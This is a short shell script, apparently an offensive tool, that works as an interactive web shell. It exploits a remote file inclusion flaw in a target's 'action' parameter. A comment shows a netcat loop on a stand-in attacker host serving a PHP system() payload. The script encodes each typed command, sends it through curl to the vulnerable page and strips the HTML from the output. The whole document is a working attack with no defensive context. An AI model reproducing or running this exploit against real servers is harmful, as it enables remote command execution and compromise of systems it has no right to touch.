#!/bin/sh
#
# Simple web shell
#
# evil.tld serves a simple PHP snippet using netcat:
#	while true; do nc -vl -p 3500 -c 'echo "HTTP/1.1 200 OK\n\n<?php system(\$_GET['c']); ?>"'; done
#
# We're using the parameter 'action' which is vulnerable to a RFI vulnerability
# to inject shell commands.
#

while true
do
    echo -n "> "
    read cmd

    cmd=$(echo ${cmd} | xxd -plain | sed 's/\(..\)/%\1/g')

    curl -s "http://target.tld/action.php?action=http://evil.tld:3500&c=${cmd}" | sed 's/<[^>]*>//g' | sed  '/^$/d'
done
